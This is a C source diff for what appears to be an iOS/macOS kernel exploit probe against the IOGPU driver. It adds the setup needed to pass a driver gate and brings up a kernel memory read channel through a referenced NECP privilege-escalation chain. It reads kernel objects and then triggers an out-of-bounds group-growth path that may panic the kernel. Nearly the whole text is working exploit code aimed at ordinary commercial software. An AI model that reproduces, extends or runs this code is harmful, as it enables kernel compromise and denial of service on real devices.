@@ -67,6 +67,8 @@
 #define CMD_ADD_RES    130u
 #define STRUCT_SZ      0x100u
 
+static uint8_t g_args[64];
+
 static void build(uint8_t *in, uint32_t cmd, uint64_t f56, uint64_t f60,
                   uint64_t f64, uint64_t f72)
 {
@@ -77,6 +79,13 @@ static void build(uint8_t *in, uint32_t cmd, uint64_t f56, uint64_t f60,
     memcpy(in + 60, &f60, 8);
     memcpy(in + 64, &f64, 8);
     memcpy(in + 72, &f72, 8);
+    /* struct[80] is the w27 gate of the new_resource path (0x9f600dc:
+     * cbz w26 -> fail). It must be non-zero. */
+    uint64_t w27 = 1;
+    memcpy(in + 80, &w27, 8);
+    /* struct[24] is a pointer to a >= 16 byte args blob (0x9f600c8: cmp x3,#16). */
+    uintptr_t ap = (uintptr_t)g_args;
+    memcpy(in + 24, &ap, 8);
 }
 
 static int call_sel(io_connect_t conn, uint32_t cmd, uint64_t f56, uint64_t f60,
@@ -92,11 +101,13 @@ static int call_sel(io_connect_t conn, uint32_t cmd, uint64_t f56, uint64_t f60,
     return (int)kr;
 }
 
-void nk_iogpu_group_oob_run(void)
+void nk_iogpu_group_oob_run(int trigger)
 {
     nk_doc_log_open("group_oob.log");
-    ol("[grp] === IOGPU group-growth OOB probe (23C55) ===");
+    ol("[grp] === IOGPU group-growth OOB probe (23C55) mode=%s ===",
+       trigger ? "TRIGGER" : "READ-ONLY");
     ol("[grp] durable log: Documents/group_oob.log");
+    if (!trigger) ol("[grp] READ-ONLY: steps 1+2 only, no add-resource, no crash");
 
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                     IOServiceMatching("IOGPU"));
@@ -115,6 +126,23 @@ void nk_iogpu_group_oob_run(void)
 
     static uint8_t out[0x200];
     size_t on = 0;
+
+    /* The readback needs the B12/NECP kernel-read channel. Bring it up here
+     * so the probe is self-contained (requires the unsafe_necp_dataonly pref
+     * in Settings -> Privilege Escalation). */
+    {
+        uint8_t probe[8];
+        int rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
+        if (rr != 0) {
+            ol("[grp] read channel down (kr=%d) - running the NECP chain", rr);
+            nk_dataonly_necp_chain();
+            rr = nk_do_kread(0xdeadbeef0000ULL, probe, sizeof(probe));
+            ol("[grp] read channel after chain: kr=%d", rr);
+            if (rr != 0) ol("[grp] WARNING: no kernel read channel; the mask check will not work");
+        } else {
+            ol("[grp] read channel already up");
+        }
+    }
 
     /* ---- step 1: new_resource (cmd 0) with capacity 64 ---- */
     ol("[grp] STEP 1 new_resource cmd=0 cap=64");
@@ -142,8 +170,29 @@ void nk_iogpu_group_oob_run(void)
     memcpy(&grp, out + 0x10, 8);
     ol("[grp] STEP 2 group ptr = 0x%016llx", (unsigned long long)grp);
 
+    /* ---- step 4 (read back the group BEFORE any add) ---- */
+    if (grp) {
+        uint8_t obj0[0x40];
+        memset(obj0, 0, sizeof(obj0));
+        int r0 = nk_do_kread(grp, obj0, sizeof(obj0));
+        ol("[grp] PRE-ADD read -> %d", r0);
+        if (r0 == 0) {
+            uint32_t c0 = 0, m0 = 0;
+            memcpy(&c0, obj0 + 0x20, 4);
+            memcpy(&m0, obj0 + 0x28, 4);
+            ol("[grp] PRE-ADD obj+0x20 count=%u  obj+0x28 MASK=0x%08x", c0, m0);
+        }
+    }
+
+    if (!trigger) {
+        ol("[grp] READ-ONLY done (use the TRIGGER button to drive the growth path)");
+        IOServiceClose(conn);
+        return;
+    }
+
     /* ---- step 3: add the resource to the group -> growth path ---- */
-    for (uint32_t h = 0; h < 4; h++) {
+    ol("[grp] TRIGGER: adding the resource to the group; this may panic the kernel");
+    for (uint32_t h = 0; h < 12; h++) {
         uint64_t cand = h == 0 ? handle : h;
         ol("[grp] STEP 3 add_resource cmd=130 handle=%llu", (unsigned long long)cand);
         kr = call_sel(conn, CMD_ADD_RES, cand, 1, 0, 0, out, &on);
